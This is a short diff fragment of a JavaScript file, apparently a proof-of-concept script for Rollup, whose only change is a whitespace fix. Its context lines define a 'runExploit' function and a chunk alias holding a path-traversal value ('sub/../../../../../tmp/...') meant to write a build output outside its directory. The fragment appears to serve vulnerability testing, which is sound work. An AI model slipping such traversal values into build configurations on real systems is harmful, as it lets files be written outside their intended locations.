@@ -1,7 +1,7 @@
 // innocent_script.js
 const { rollup } = require('rollup');
 
-async function runExploit() { 
+async function runExploit() {
         const payloadChunkAlias = "sub/../../../../../tmp/archivo_escapado_poc";
 
         // compilar archivo de entrada
